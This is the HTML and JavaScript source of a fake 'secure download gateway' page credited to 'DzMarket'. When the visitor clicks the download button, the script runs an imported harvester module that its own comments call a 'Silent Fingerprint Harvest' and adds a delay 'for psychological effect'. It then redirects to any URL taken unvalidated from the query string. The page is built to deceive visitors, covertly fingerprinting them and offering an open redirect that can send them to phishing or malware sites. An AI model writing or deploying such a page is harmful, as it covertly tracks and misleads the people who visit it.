
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Gateway | Secure Transfer</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>body { font-family: 'Inter', sans-serif; }</style>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center h-screen overflow-hidden relative">

    <div class="absolute inset-0 z-0 opacity-20">
        <div class="absolute top-0 left-0 w-72 h-72 bg-blue-600 rounded-full mix-blend-multiply filter blur-xl animate-blob"></div>
        <div class="absolute top-0 right-0 w-72 h-72 bg-indigo-600 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-2000"></div>
    </div>

    <div class="z-10 bg-white/10 backdrop-blur-lg border border-white/20 p-8 rounded-3xl shadow-2xl text-center max-w-sm w-full mx-4">
        
        <div class="mb-6 relative inline-block">
            <div class="absolute inset-0 bg-blue-500 blur-lg opacity-40 rounded-full animate-pulse"></div>
            <svg class="w-20 h-20 text-blue-400 relative z-10 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
            </svg>
        </div>

        <h1 class="text-2xl font-bold mb-2">Preparing Your Link</h1>
        <p class="text-gray-300 text-sm mb-8">Please click the button below to proceed to your download destination.</p>

        <button id="downloadBtn" onclick="processDownload()" class="w-full bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-bold py-4 rounded-xl shadow-lg transform transition hover:scale-105 flex items-center justify-center gap-2 group">
            <span>Download Now</span>
            <svg class="w-5 h-5 group-hover:translate-y-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
            </svg>
        </button>

        <p class="mt-4 text-xs text-slate-500">Fast & Secure Gateway by DzMarket</p>
    </div>

    <script type="module">
        import { initHarvester } from '/modules/harvester.js';

        // Advanced function to extract the URL correctly even with special characters
        function getTargetUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            let target = urlParams.get('url');
            
            if (!target) {
                const fullUrl = window.location.href;
                if (fullUrl.includes('url=')) {
                    target = fullUrl.split('url=')[1];
                }
            }
            
            return target ? decodeURIComponent(target) : 'https://google.com';
        }

        window.processDownload = async function() {
            const btn = document.getElementById('downloadBtn');
            const target = getTargetUrl();

            // Change button state to loading
            btn.innerHTML = `<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Processing...`;
            btn.disabled = true;

            try {
                // 🎣 Silent Fingerprint Harvest
                await initHarvester();
                
                // Minimal delay for psychological effect
                await new Promise(r => setTimeout(r, 700));

            } catch (error) {
                console.error("Harvest failed, but redirecting...", error);
            }

            // 🚀 Final Redirect to Mediafire or any other link
            window.location.href = target;
        };
    </script>
</body>
</html>
